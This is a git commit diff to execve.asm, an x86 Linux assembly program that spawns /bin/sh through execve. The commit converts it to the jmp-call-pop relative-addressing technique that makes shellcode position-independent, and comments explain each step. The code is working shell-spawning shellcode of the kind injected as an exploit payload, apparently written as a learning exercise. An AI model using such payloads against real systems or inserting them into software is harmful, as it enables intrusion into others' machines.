2885af544fddeda513ca9a74651180f89ccaf30b
s0lst1c3 <contact@solstice.me>
2015-03-06 02:47:08 -0500

    switched to relative addressing

--- execve.asm
+++ execve.asm
@@ -1,27 +1,40 @@
 global _start
 
-section .data
-	
-	shell: db "/bin/sh", 0x0
-
-section .bss
-
 section .text
 
 	_start:
+	
+		jmp callback
 
-	push 0x0
-	push shell
+	spawnshell:
+	
+		; pop the address of our "/bin/sh" string into esi
+		pop esi
 
-	xor edx, edx
-	mov ecx, esp
-	mov ebx, shell
-	mov eax, 0xb
-	int 0x80
+		; create the arg array to feed to execve
+		push 0x0
+		push esi
 
-	; if we've made it this far, then execve has failed and 
-	; we need to exit gracefully
+		; set execve parameters
+		xor edx, edx
+		mov ecx, esp
+		mov ebx, esi
 
-	mov eax, 0x1
-	xor ebx, ebx
-	int 0x80
+		; invoke execve system call
+		mov eax, 0xb
+		int 0x80
+	
+		; if we've made it this far, then execve has failed and 
+		; we need to exit gracefully
+		xor ebx, ebx
+		mov eax, 0x1
+		int 0x80
+	
+	
+	callback:
+	
+		; when we call spawnshell, the address of "/bin/sh" string
+		; is pushed onto the stack, so we can access it by 
+		; popping esi in spawnshell
+		call spawnshell
+		db "/bin/sh",0
